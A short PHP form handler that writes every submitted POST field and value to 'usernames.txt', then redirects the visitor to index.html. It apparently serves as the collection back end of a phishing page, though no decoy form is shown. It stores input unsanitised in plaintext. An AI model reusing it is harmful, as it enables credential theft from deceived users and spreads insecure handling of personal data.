<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Open the file "usernames.txt" in append mode for writing
    $handle = fopen("usernames.txt", "a");

    // Iterate through all the POST variables sent from the form
    foreach ($_POST as $variable => $value) {
        // Write the variable name to the file
        fwrite($handle, $variable);
        // Write "=" to the file
        fwrite($handle, "=");
        // Write the value of the variable to the file
        fwrite($handle, $value);
        // Write newline characters to separate entries
        fwrite($handle, "\n");
    }

    // Close the file
    fclose($handle);

    // Redirect the user back to the form
    header('Location: index.html');
} else {
    echo "Invalid request.";
}
?>
